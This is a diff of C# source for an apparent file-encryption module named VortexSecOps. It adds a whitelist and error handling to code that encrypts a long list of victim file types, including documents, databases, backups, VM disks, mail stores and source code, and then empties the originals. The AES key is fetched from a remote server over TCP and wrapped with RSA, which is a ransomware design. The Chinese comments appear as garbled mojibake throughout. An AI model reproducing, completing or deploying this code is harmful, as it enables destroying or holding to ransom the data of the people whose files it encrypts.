@@ -1,4 +1,4 @@
-using System;
+ï»¿using System;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
@@ -17,7 +17,7 @@ namespace VortexSecOps
             private string _aesKey;
             private string _key;
             /// <summary>
-            /// Ëæ»úÃÜÔ¿
+            /// éšæœºå¯†é’¥
             /// </summary>
             public string Key
             {
@@ -25,7 +25,7 @@ namespace VortexSecOps
                 private set { _key = value; }
             }
             /// <summary>
-            /// RSAË½Ô¿
+            /// RSAç§é’¥
             /// </summary>
             public string AesKey
             {
@@ -47,30 +47,39 @@ namespace VortexSecOps
         public interface IAesRsaCryptographyService
         {
             /// <summary>
-            /// ÓÃAES¼ÓÃÜÎÄ¼ş
+            /// æ˜¯å¦å¼€å¯åŠ å¯†ç™½åå•ï¼Œé»˜è®¤å€¼ä¸ºfalse
             /// </summary>
-            /// <param name="filepath">ÎÄ¼şÂ·¾¶</param>
-            /// <param name="Key">AESÃÜÔ¿</param>
-            void EncryptFileWithAesKey(string filepath, byte[] Key, bool debug = false);
+            bool UseEncryptionWhitelist { get; set; }
             /// <summary>
-            /// ÓÃAES½âÃÜÎÄ¼ş
+            /// æ–‡ä»¶åŠ å¯†ç™½åå•ï¼ŒæŒ‡å®šä¸éœ€è¦åŠ å¯†çš„æ–‡ä»¶ç±»å‹ï¼Œæ‰©å±•åç”¨é€šé…ç¬¦(ä¾‹ï¼š*.txt)è¡¨ç¤º
             /// </summary>
-            /// <param name="filepath">ÎÄ¼şÂ·¾¶</param>
-            /// <param name="Key">AESÃÜÔ¿</param>
+            string[] NotEncryptedFileExtension { get; set; }
+            /// <summary>
+            /// ç”¨AESåŠ å¯†æ–‡ä»¶
+            /// </summary>
+            /// <param name="filepath">æ–‡ä»¶è·¯å¾„</param>
+            /// <param name="Key">AESå¯†é’¥</param>
+            /// <returns>è¿”å›falseåˆ™è¡¨ç¤ºå·²æ’é™¤ç™½åå•</returns>
+            bool EncryptFileWithAesKey(string filepath, byte[] Key, bool debug = false);
+            /// <summary>
+            /// ç”¨AESè§£å¯†æ–‡ä»¶
+            /// </summary>
+            /// <param name="filepath">æ–‡ä»¶è·¯å¾„</param>
+            /// <param name="Key">AESå¯†é’¥</param>
             void DecryptFileWithAesKey(string filepath, byte[] Key);
             /// <summary>
-            /// ÓÃRSA¼ÓÃÜAESÃÜÔ¿
+            /// ç”¨RSAåŠ å¯†AESå¯†é’¥
             /// </summary>
-            /// <param name="PublicKey">RSA¹«Ô¿µÄXML×Ö·û´®</param>
+            /// <param name="PublicKey">RSAå…¬é’¥çš„XMLå­—ç¬¦ä¸²</param>
             void EncryptAesKeyWithRsa(string PublicKey);
             /// <summary>
-            /// ÓÃRSA½âÃÜAESÃÜÔ¿
+            /// ç”¨RSAè§£å¯†AESå¯†é’¥
             /// </summary>
             void DecryptAesKeyWithRsa(string PrivateKey);
         }
         /// <summary>
-        ///  ¸ÃÀàÓÃÓÚ·â×° AES ¼ÓÃÜËùĞèµÄÃÜÔ¿£¨Key£©ºÍ³õÊ¼»¯ÏòÁ¿£¨IV£©¡£
-        /// ËüÌá¹©ÁË¶ÔÃÜÔ¿ºÍ³õÊ¼»¯ÏòÁ¿µÄ°²È«¹ÜÀí£¬È·±£ÃÜÔ¿³¤¶È·ûºÏ AES ¹æ·¶¡£
+        ///  è¯¥ç±»ç”¨äºå°è£… AES åŠ å¯†æ‰€éœ€çš„å¯†é’¥ï¼ˆKeyï¼‰å’Œåˆå§‹åŒ–å‘é‡ï¼ˆIVï¼‰ã€‚
+        /// å®ƒæä¾›äº†å¯¹å¯†é’¥å’Œåˆå§‹åŒ–å‘é‡çš„å®‰å…¨ç®¡ç†ï¼Œç¡®ä¿å¯†é’¥é•¿åº¦ç¬¦åˆ AES è§„èŒƒã€‚
         /// </summary>
         public class AesKeyAndIv
         {
@@ -83,7 +92,7 @@ namespace VortexSecOps
                 {
                     if (value == null || (value.Length != 32 && value.Length != 24 && value.Length != 16))
                     {
-                        throw new ArgumentException("AES ÃÜÔ¿³¤¶È±ØĞëÎª 16¡¢24 »ò 32 ×Ö½Ú¡£");
+                        throw new ArgumentException("AES å¯†é’¥é•¿åº¦å¿…é¡»ä¸º 16ã€24 æˆ– 32 å­—èŠ‚ã€‚");
                     }
                     _key = value;
                 }
@@ -95,7 +104,7 @@ namespace VortexSecOps
                 {
                     if (value == null || value.Length != 16)
                     {
-                        throw new ArgumentException("³õÊ¼»¯ÏòÁ¿±ØĞëÎª16×Ö½Ú");
+                        throw new ArgumentException("åˆå§‹åŒ–å‘é‡å¿…é¡»ä¸º16å­—èŠ‚");
                     }
                     _iv = value;
                 }
@@ -106,10 +115,10 @@ namespace VortexSecOps
                 this.Iv = Iv;
             }
             /// <summary>
-            /// ÓÃÓÚ´´½¨ AesKeyAndIv ÀàµÄĞÂÊµÀı¡£
+            /// ç”¨äºåˆ›å»º AesKeyAndIv ç±»çš„æ–°å®ä¾‹ã€‚
             /// </summary>
-            /// <param name="Key">AES ¼ÓÃÜÊ¹ÓÃµÄÃÜÔ¿£¬³¤¶È±ØĞëÎª 16¡¢24 »ò 32 ×Ö½Ú¡£</param>
-            /// <param name="Iv">AES ¼ÓÃÜÊ¹ÓÃµÄ³õÊ¼»¯ÏòÁ¿£¬³¤¶È±ØĞëÎª 16 ×Ö½Ú¡£</param>
+            /// <param name="Key">AES åŠ å¯†ä½¿ç”¨çš„å¯†é’¥ï¼Œé•¿åº¦å¿…é¡»ä¸º 16ã€24 æˆ– 32 å­—èŠ‚ã€‚</param>
+            /// <param name="Iv">AES åŠ å¯†ä½¿ç”¨çš„åˆå§‹åŒ–å‘é‡ï¼Œé•¿åº¦å¿…é¡»ä¸º 16 å­—èŠ‚ã€‚</param>
             /// <returns></returns>
             public static AesKeyAndIv CreateNewAes(byte[] Key, byte[] Iv)
             {
@@ -118,50 +127,63 @@ namespace VortexSecOps
         }
         public class AesRsaEncryptionManager : IAesRsaCryptographyService
         {
+            private bool _UseEncryptionWhitelist = false;
+            public bool UseEncryptionWhitelist
+            {
+                get { return _UseEncryptionWhitelist; }
+                set { _UseEncryptionWhitelist = value; }
+            }
             private const string AES_KEY_FILE_PATH = @"C:\bin\AES_Key.bin";
             public const string AES_KEY_ENCRYPTED_FILE_PATH = @"C:\bin\AES_Key.bin.Encrypt";
+            private string[] _notencryptedFileExtension;
+            
+            public string[] NotEncryptedFileExtension
+            {
+                get { return _notencryptedFileExtension; }
+                set { _notencryptedFileExtension = value; }
+            }
             public static string[] encryptedFileExtensions = {
-                 // °ì¹«ÎÄµµ
+                 // åŠå…¬æ–‡æ¡£
                  "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.ods", "*.odp", "*.pdf", "*.rtf", "*.txt", "*.csv", "*.log",
-                 // Êı¾İ¿âÎÄ¼ş
+                 // æ•°æ®åº“æ–‡ä»¶
                  "*.sql", "*.mdb", "*.db", "*.sqlite", "*.dbf", "*.accdb", "*.bak",
-                 // Í¼Æ¬ÎÄ¼ş
+                 // å›¾ç‰‡æ–‡ä»¶
                  "*.jpg", "*.jpeg", "*.png", "*.tif", "*.tiff", "*.ico", "*.bmp", "*.gif", "*.svg", "*.psd", "*.ai", "*.eps", "*.raw", "*.cr2", "*.nef",
-                 // ÊÓÆµÎÄ¼ş
+                 // è§†é¢‘æ–‡ä»¶
                  "*.mp4", "*.avi", "*.mov", "*.mkv", "*.flv", "*.wmv", "*.mpeg", "*.mpg", "*.3gp", "*.webm", "*.vob",
-                 // ÒôÆµÎÄ¼ş
+                 // éŸ³é¢‘æ–‡ä»¶
                  "*.mp3", "*.wav", "*.flac", "*.ogg", "*.aac", "*.m4a", "*.wma", "*.mid", "*.amr",
-                 // Ñ¹ËõÎÄ¼ş
+                 // å‹ç¼©æ–‡ä»¶
                  "*.zip", "*.rar", "*.7z", "*.tar", "*.gz", "*.bz2", "*.xz",
-                 // ¿ÉÖ´ĞĞÎÄ¼ş
+                 // å¯æ‰§è¡Œæ–‡ä»¶
                  "*.exe", "*.msi", "*.com", "*.bat", "*.sh", "*.ps1",
-                 // ÅäÖÃÎÄ¼ş
+                 // é…ç½®æ–‡ä»¶
                  "*.ini", "*.json", "*.xml", "*.cfg", "*.conf", "*.reg",
-                 // ½Å±¾ÎÄ¼ş
+                 // è„šæœ¬æ–‡ä»¶
                  "*.py", "*.js", "*.php", "*.rb", "*.lua", "*.pl", "*.vb",
-                 // Éè¼ÆÎÄ¼ş
+                 // è®¾è®¡æ–‡ä»¶
                  "*.indd", "*.cdr", "*.xd", "*.sketch",
-                 // ÓÊ¼şÎÄ¼ş
+                 // é‚®ä»¶æ–‡ä»¶
                  "*.eml", "*.msg", "*.pst", "*.ost",
-                 // ¹¤³ÌÎÄ¼ş
+                 // å·¥ç¨‹æ–‡ä»¶
                   "*.vcxproj", "*.sln", "*.csproj", "*.fsproj", "*.java", "*.class", "*.cs", "*.cpp", "*.h", "*.hpp",
-                 // ĞéÄâ»úÎÄ¼ş
+                 // è™šæ‹Ÿæœºæ–‡ä»¶
                  "*.vmdk", "*.vdi", "*.ova", "*.ovf",
-                 // ÍøÒ³ÎÄ¼ş
+                 // ç½‘é¡µæ–‡ä»¶
                  "*.html", "*.htm", "*.css", "*.jsx",
-                 // µç×ÓÊéÎÄ¼ş
+                 // ç”µå­ä¹¦æ–‡ä»¶
                  "*.epub", "*.mobi", "*.azw3",
-                 // ÆäËûÔÓÏî
+                 // å…¶ä»–æ‚é¡¹
                  "*.iso", "*.bin", "*.dat", "*.swf", "*.xps"
              };
             /// <summary>
-            /// ²»ÔÊĞíÍâ²¿Ö±½ÓÊµÀı»¯
+            /// ä¸å…è®¸å¤–éƒ¨ç›´æ¥å®ä¾‹åŒ–
             /// </summary>
             private AesRsaEncryptionManager() { }
             /// <summary>
-            /// ´´½¨AesKey¶ÔÏóµÄÌØ¶¨·½·¨£¬ÊµÀı»¯´ËÀà±ØĞëÊ¹ÓÃIAesKey½Ó¿Ú
+            /// åˆ›å»ºAesKeyå¯¹è±¡çš„ç‰¹å®šæ–¹æ³•ï¼Œå®ä¾‹åŒ–æ­¤ç±»å¿…é¡»ä½¿ç”¨IAesKeyæ¥å£
             /// </summary>
-            /// <returns>ĞÂµÄAesRsaEncryptionManagerÊµÀı</returns>
+            /// <returns>æ–°çš„AesRsaEncryptionManagerå®ä¾‹</returns>
             public static IAesRsaCryptographyService Create()
             {
                 if (!Directory.Exists(@"C:\bin"))
@@ -200,14 +222,14 @@ namespace VortexSecOps
                 }
             }
             /// <summary>
-            /// Í¨¹ıTCPĞ­Òé´ÓÖ¸¶¨·şÎñÆ÷»ñÈ¡RsaRandomKeyPackÊµÀı
+            /// é€šè¿‡TCPåè®®ä»æŒ‡å®šæœåŠ¡å™¨è·å–RsaRandomKeyPackå®ä¾‹
             /// </summary>
-            /// <param name="ipAddress">Ä¿±ê·şÎñÆ÷µÄIPµØÖ·£¨IPv4¸ñÊ½£©</param>
-            /// <param name="aesKeyAndIv">ÓÃÓÚ½âÃÜ´Ó·şÎñÆ÷½ÓÊÕÊı¾İµÄAESÃÜÔ¿ºÍ³õÊ¼»¯ÏòÁ¿</param>
-            /// <param name="serverPort">Ä¿±ê·şÎñÆ÷¶Ë¿Ú£¬Ä¬ÈÏÖµÎª8888</param>
-            /// <returns>RsaRandomKeyPackÊµÀı</returns>
-            /// <exception cref="TimeoutException">µ±Á¬½Ó·şÎñÆ÷³¬Ê±£¬Å×³ö´ËÒì³£¡£</exception>
-            /// <exception cref="GetAesKeyException">µ±½ÓÊÕµ½µÄÃÜÔ¿¸ñÊ½ÎŞĞ§»òÑéÖ¤Ê§°ÜÊ±´¥·¢´ËÒì³£</exception>
+            /// <param name="ipAddress">ç›®æ ‡æœåŠ¡å™¨çš„IPåœ°å€ï¼ˆIPv4æ ¼å¼ï¼‰</param>
+            /// <param name="aesKeyAndIv">ç”¨äºè§£å¯†ä»æœåŠ¡å™¨æ¥æ”¶æ•°æ®çš„AESå¯†é’¥å’Œåˆå§‹åŒ–å‘é‡</param>
+            /// <param name="serverPort">ç›®æ ‡æœåŠ¡å™¨ç«¯å£ï¼Œé»˜è®¤å€¼ä¸º8888</param>
+            /// <returns>RsaRandomKeyPackå®ä¾‹</returns>
+            /// <exception cref="TimeoutException">å½“è¿æ¥æœåŠ¡å™¨è¶…æ—¶ï¼ŒæŠ›å‡ºæ­¤å¼‚å¸¸ã€‚</exception>
+            /// <exception cref="GetAesKeyException">å½“æ¥æ”¶åˆ°çš„å¯†é’¥æ ¼å¼æ— æ•ˆæˆ–éªŒè¯å¤±è´¥æ—¶è§¦å‘æ­¤å¼‚å¸¸</exception>
             public static async Task<AesRandomKeyPack> GetRemoteAesKey(string ipAddress, AesKeyAndIv aesKeyAndIv, int serverPort = 8888)
             {
                 string key;
@@ -228,7 +250,7 @@ namespace VortexSecOps
                         Task timeTask = Task.Delay(-1, cancellationTokenSource.Token);
                         if (await Task.WhenAny(connectTask, timeTask) == timeTask)
                         {
-                            throw new TimeoutException("Á¬½Ó³¬Ê±£¬Çë¼ì²é·şÎñÆ÷×´Ì¬¡£");
+                            throw new TimeoutException("è¿æ¥è¶…æ—¶ï¼Œè¯·æ£€æŸ¥æœåŠ¡å™¨çŠ¶æ€ã€‚");
                         }
                         using (NetworkStream networkStream = tcpClient.GetStream())
                         {
@@ -241,20 +263,20 @@ namespace VortexSecOps
                         string[] tcpMessage = key.Split(strs, StringSplitOptions.RemoveEmptyEntries);
                         if (key.Length == 0 || tcpMessage.Length < 2 || tcpMessage[0] == key)
                         {
-                            throw new GetAesKeyException("ÎŞ·¨ÑéÖ¤»ñÈ¡µÄÃÜÔ¿");
+                            throw new GetAesKeyException("æ— æ³•éªŒè¯è·å–çš„å¯†é’¥");
                         }
                         return new AesRandomKeyPack(tcpMessage[1], tcpMessage[0]);
                     }
                 }
             }
             /// <summary>
-            /// Í¨¹ıTCPĞ­Òé´ÓÖ¸¶¨·şÎñÆ÷»ñÈ¡RsaRandomKeyPackÊµÀı
+            /// é€šè¿‡TCPåè®®ä»æŒ‡å®šæœåŠ¡å™¨è·å–RsaRandomKeyPackå®ä¾‹
             /// </summary>
-            /// <param name="ipAddress">Ä¿±ê·şÎñÆ÷µÄIPµØÖ·£¨IPv4¸ñÊ½£©</param>
-            /// <param name="serverPort">Ä¿±ê·şÎñÆ÷¶Ë¿Ú£¬Ä¬ÈÏÖµÎª8888</param>
-            /// <returns>RsaRandomKeyPackÊµÀı</returns>
-            /// <exception cref="TimeoutException">µ±Á¬½Ó·şÎñÆ÷³¬Ê±£¬Å×³ö´ËÒì³£¡£</exception>
-            /// <exception cref="GetAesKeyException">µ±½ÓÊÕµ½µÄÃÜÔ¿¸ñÊ½ÎŞĞ§»òÑéÖ¤Ê§°ÜÊ±´¥·¢´ËÒì³£</exception>
+            /// <param name="ipAddress">ç›®æ ‡æœåŠ¡å™¨çš„IPåœ°å€ï¼ˆIPv4æ ¼å¼ï¼‰</param>
+            /// <param name="serverPort">ç›®æ ‡æœåŠ¡å™¨ç«¯å£ï¼Œé»˜è®¤å€¼ä¸º8888</param>
+            /// <returns>RsaRandomKeyPackå®ä¾‹</returns>
+            /// <exception cref="TimeoutException">å½“è¿æ¥æœåŠ¡å™¨è¶…æ—¶ï¼ŒæŠ›å‡ºæ­¤å¼‚å¸¸ã€‚</exception>
+            /// <exception cref="GetAesKeyException">å½“æ¥æ”¶åˆ°çš„å¯†é’¥æ ¼å¼æ— æ•ˆæˆ–éªŒè¯å¤±è´¥æ—¶è§¦å‘æ­¤å¼‚å¸¸</exception>
             public static async Task<AesRandomKeyPack> GetRemoteAesKey(string ipAddress, int serverPort = 8888)
             {
                 string key;
@@ -275,7 +297,7 @@ namespace VortexSecOps
                         Task timeTask = Task.Delay(-1, cancellationTokenSource.Token);
                         if (await Task.WhenAny(connectTask, timeTask) == timeTask)
                         {
-                            throw new TimeoutException("Á¬½Ó³¬Ê±£¬Çë¼ì²é·şÎñÆ÷×´Ì¬¡£");
+                            throw new TimeoutException("è¿æ¥è¶…æ—¶ï¼Œè¯·æ£€æŸ¥æœåŠ¡å™¨çŠ¶æ€ã€‚");
                         }
                         using (NetworkStream networkStream = tcpClient.GetStream())
                         {
@@ -288,16 +310,16 @@ namespace VortexSecOps
                         string[] tcpMessage = key.Split(strs, StringSplitOptions.RemoveEmptyEntries);
                         if (key.Length == 0 || tcpMessage.Length < 2 || tcpMessage[0] == key)
                         {
-                            throw new GetAesKeyException("ÎŞ·¨ÑéÖ¤»ñÈ¡µÄÃÜÔ¿");
+                            throw new GetAesKeyException("æ— æ³•éªŒè¯è·å–çš„å¯†é’¥");
                         }
                         return new AesRandomKeyPack(tcpMessage[1], tcpMessage[0]);
                     }
                 }
             }
-            /// <summary>ÓÃ AES ¼ÓÃÜ×Ö·û´®</summary>
-            /// <param name="plainText">Ã÷ÎÄ×Ö·û´®</param>
-            /// <param name="aesKeyAndIv">AES ÃÜÔ¿ºÍ³õÊ¼»¯ÏòÁ¿</param>
-            /// <returns>¼ÓÃÜºóµÄ×Ö½ÚÊı×é</returns>
+            /// <summary>ç”¨ AES åŠ å¯†å­—ç¬¦ä¸²</summary>
+            /// <param name="plainText">æ˜æ–‡å­—ç¬¦ä¸²</param>
+            /// <param name="aesKeyAndIv">AES å¯†é’¥å’Œåˆå§‹åŒ–å‘é‡</param>
+            /// <returns>åŠ å¯†åçš„å­—èŠ‚æ•°ç»„</returns>
             public static byte[] AesEncrypt(string plainText, AesKeyAndIv aesKeyAndIv)
             {
                 byte[] encryped;
@@ -322,10 +344,10 @@ namespace VortexSecOps
                 }
                 return encryped;
             }
-            /// <summary>ÓÃ AES ½âÃÜ×Ö·û´®</summary>
-            /// <param name="encryped">¼ÓÃÜºóµÄ×Ö½ÚÊı×é</param>
-            /// <param name="aesKeyAndIv">AES ÃÜÔ¿ºÍ³õÊ¼»¯ÏòÁ¿</param>
-            /// <returns>½âÃÜºóµÄÃ÷ÎÄ×Ö·û´®</returns>
+            /// <summary>ç”¨ AES è§£å¯†å­—ç¬¦ä¸²</summary>
+            /// <param name="encryped">åŠ å¯†åçš„å­—èŠ‚æ•°ç»„</param>
+            /// <param name="aesKeyAndIv">AES å¯†é’¥å’Œåˆå§‹åŒ–å‘é‡</param>
+            /// <returns>è§£å¯†åçš„æ˜æ–‡å­—ç¬¦ä¸²</returns>
             public static string AesDecrypt(byte[] encryped, AesKeyAndIv aesKeyAndIv)
             {
                 string plaintext = null;
@@ -349,10 +371,10 @@ namespace VortexSecOps
                 }
                 return plaintext;
             }
-            /// <summary>ÓÃ RSA ¼ÓÃÜ×Ö½ÚÊı×é</summary>
-            /// <param name="plainTextBytes">´ı¼ÓÃÜµÄ×Ö½ÚÊı×é</param>
-            /// <param name="PublicKey">RSA ¹«Ô¿µÄ XML ×Ö·û´®</param>
-            /// <returns>¼ÓÃÜºóµÄ×Ö½ÚÊı×é</returns>
+            /// <summary>ç”¨ RSA åŠ å¯†å­—èŠ‚æ•°ç»„</summary>
+            /// <param name="plainTextBytes">å¾…åŠ å¯†çš„å­—èŠ‚æ•°ç»„</param>
+            /// <param name="PublicKey">RSA å…¬é’¥çš„ XML å­—ç¬¦ä¸²</param>
+            /// <returns>åŠ å¯†åçš„å­—èŠ‚æ•°ç»„</returns>
             public static byte[] RsaEncrypt(byte[] plainTextBytes, string PublicKey)
             {
                 byte[] cipherText;
@@ -363,10 +385,10 @@ namespace VortexSecOps
                 }
                 return cipherText;
             }
-            /// <summary>ÓÃ RSA ½âÃÜ×Ö½ÚÊı×é</summary>
-            /// <param name="cipherText">´ı½âÃÜµÄ×Ö½ÚÊı×é</param>
-            /// <param name="PrivateKey">RSA Ë½Ô¿</param>
-            /// <returns>½âÃÜºóµÄ×Ö½ÚÊı×é</returns>
+            /// <summary>ç”¨ RSA è§£å¯†å­—èŠ‚æ•°ç»„</summary>
+            /// <param name="cipherText">å¾…è§£å¯†çš„å­—èŠ‚æ•°ç»„</param>
+            /// <param name="PrivateKey">RSA ç§é’¥</param>
+            /// <returns>è§£å¯†åçš„å­—èŠ‚æ•°ç»„</returns>
             public static byte[] RsaDecrypt(byte[] cipherText, string PrivateKey)
             {
                 byte[] plainTextBytes;
@@ -419,8 +441,18 @@ namespace VortexSecOps
                     }
                 }
             }
-            void IAesRsaCryptographyService.EncryptFileWithAesKey(string filepath, byte[] Key, bool debug)
+            bool IAesRsaCryptographyService.EncryptFileWithAesKey(string filepath, byte[] Key, bool debug)
             {
+                if (_UseEncryptionWhitelist is true)
+                {
+                    foreach (string fileExtension in NotEncryptedFileExtension)
+                    {
+                        if (fileExtension == $"*{Path.GetExtension(filepath)}")
+                        {
+                            return false;
+                        }
+                    } 
+                }
                 int buffersize;
                 FileInfo fileInfo = new FileInfo(filepath);
                 if (fileInfo.Length > 1024 * 1024 && fileInfo.Length <= 1024 * 1024 * 100)
@@ -473,6 +505,42 @@ namespace VortexSecOps
                     }
                     File.WriteAllBytes(filepath, new byte[0]);
                 }
+                catch(IOException ex)
+                {
+                    if (debug)
+                    {
+                        try
+                        {
+                            using (StreamWriter sw = new StreamWriter(@"C:\encryptDebug.txt", true, Encoding.UTF8))
+                            {
+                                sw.WriteLine(ex.Message);
+                                sw.WriteLine(ex.GetType().ToString());
+                            }
+                        }
+                        catch (Exception)
+                        {
+                        }
+                    }
+                    return false;
+                }
+                catch (UnauthorizedAccessException ex)
+                {
+                    if (debug)
+                    {
+                        try
+                        {
+                            using (StreamWriter sw = new StreamWriter(@"C:\encryptDebug.txt", true, Encoding.UTF8))
+                            {
+                                sw.WriteLine(ex.Message);
+                                sw.WriteLine(ex.GetType().ToString());
+                            }
+                        }
+                        catch (Exception)
+                        {
+                        }
+                    }
+                    return false;
+                }
                 catch (Exception ex)
                 {
                     if (debug)
@@ -491,6 +559,7 @@ namespace VortexSecOps
                         }
                     }
                 }
+                return true;
             }
             void IAesRsaCryptographyService.DecryptFileWithAesKey(string filepath, byte[] Key)
             {
@@ -517,7 +586,7 @@ namespace VortexSecOps
                     byte[] buffer = new byte[buffersize];
                     if (Key.Length != 32)
                     {
-                        MessageBox.Show("µ¼ÈëµÄÃÜÔ¿²»·ûºÏÒªÇó", "´íÎó", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        MessageBox.Show("å¯¼å…¥çš„å¯†é’¥ä¸ç¬¦åˆè¦æ±‚", "é”™è¯¯", MessageBoxButtons.OK, MessageBoxIcon.Error);
                         return;
                     }
                     using (Aes aes = Aes.Create())
@@ -540,7 +609,7 @@ namespace VortexSecOps
                                     int readIV = fileStream.Read(iv, 0, 16);
                                     if (readIV < 16)
                                     {
-                                        MessageBox.Show("ÎÄ¼şËğ»µ»òÎ´¼ÓÃÜ", "´íÎó", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                                        MessageBox.Show("æ–‡ä»¶æŸåæˆ–æœªåŠ å¯†", "é”™è¯¯", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                         return;
                                     }
                                     aes.IV = iv;
@@ -587,7 +656,7 @@ namespace VortexSecOps
 
                         if (aes.Key.Length != 32)
                         {
-                            MessageBox.Show("µ¼ÈëµÄÃÜÔ¿²»·ûºÏÒªÇó", "´íÎó", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            MessageBox.Show("å¯¼å…¥çš„å¯†é’¥ä¸ç¬¦åˆè¦æ±‚", "é”™è¯¯", MessageBoxButtons.OK, MessageBoxIcon.Error);
                             return new byte[0];
                         }
 
@@ -596,30 +665,30 @@ namespace VortexSecOps
                 }
                 catch (Exception ex)
                 {
-                    MessageBox.Show($"·¢ÉúÒì³££º{ex.Message}", "´íÎó", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    MessageBox.Show($"å‘ç”Ÿå¼‚å¸¸ï¼š{ex.Message}", "é”™è¯¯", MessageBoxButtons.OK, MessageBoxIcon.Error);
                     return new byte[0];
                 }
             }
             public static string Random_Key()
             {
-                // ´´½¨Ò»¸öRandom¶ÔÏó£¬ÓÃÓÚÉú³ÉËæ»úÊı
+                // åˆ›å»ºä¸€ä¸ªRandomå¯¹è±¡ï¼Œç”¨äºç”Ÿæˆéšæœºæ•°
                 Random random = new Random();
-                // ½«°üº¬´óĞ¡Ğ´×ÖÄ¸ºÍÊı×ÖµÄ×Ö·û´®×ª»»Îª×Ö·ûÊı×é£¬×÷ÎªÉú³ÉÃÜÔ¿µÄ×Ö·ûÀ´Ô´
+                // å°†åŒ…å«å¤§å°å†™å­—æ¯å’Œæ•°å­—çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—ç¬¦æ•°ç»„ï¼Œä½œä¸ºç”Ÿæˆå¯†é’¥çš„å­—ç¬¦æ¥æº
                 char[] KEYChar = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789".ToCharArray();
-                // ´´½¨Ò»¸ö³¤¶ÈÎª27µÄ×Ö·ûÊı×é£¬ÓÃÓÚ´æ´¢Éú³ÉµÄÃÜÔ¿×Ö·û
+                // åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º27çš„å­—ç¬¦æ•°ç»„ï¼Œç”¨äºå­˜å‚¨ç”Ÿæˆçš„å¯†é’¥å­—ç¬¦
                 char[] Key = new char[27];
-                // Ñ­»·27´Î£¬Ã¿´ÎÉú³ÉÒ»¸öËæ»úË÷Òı£¬´ÓKEYChar×Ö·ûÊı×éÖĞÑ¡È¡¶ÔÓ¦×Ö·û·ÅÈëKeyÊı×éÖĞ£¬ÒÔ´Ë¹¹½¨ÃÜÔ¿×Ö·û´®
+                // å¾ªç¯27æ¬¡ï¼Œæ¯æ¬¡ç”Ÿæˆä¸€ä¸ªéšæœºç´¢å¼•ï¼Œä»KEYCharå­—ç¬¦æ•°ç»„ä¸­é€‰å–å¯¹åº”å­—ç¬¦æ”¾å…¥Keyæ•°ç»„ä¸­ï¼Œä»¥æ­¤æ„å»ºå¯†é’¥å­—ç¬¦ä¸²
                 for (int i = 0; i < 27; i++)
                 {
                     int index = random.Next(0, KEYChar.Length);
                     Key[i] = KEYChar[index];
                 }
-                // ½«Éú³ÉµÄ×Ö·ûÊı×é×ª»»Îª×Ö·û´®²¢·µ»Ø£¬×÷ÎªËæ»úÉú³ÉµÄÃÜÔ¿
+                // å°†ç”Ÿæˆçš„å­—ç¬¦æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶è¿”å›ï¼Œä½œä¸ºéšæœºç”Ÿæˆçš„å¯†é’¥
                 return new string(Key);
             }
         }
         /// <summary>
-        /// ÃÜÔ¿¸ñÊ½ÎŞĞ§»òÑéÖ¤Ê§°ÜÊ±´¥·¢´ËÒì³£
+        /// å¯†é’¥æ ¼å¼æ— æ•ˆæˆ–éªŒè¯å¤±è´¥æ—¶è§¦å‘æ­¤å¼‚å¸¸
         /// </summary>
         class GetAesKeyException : Exception
         {
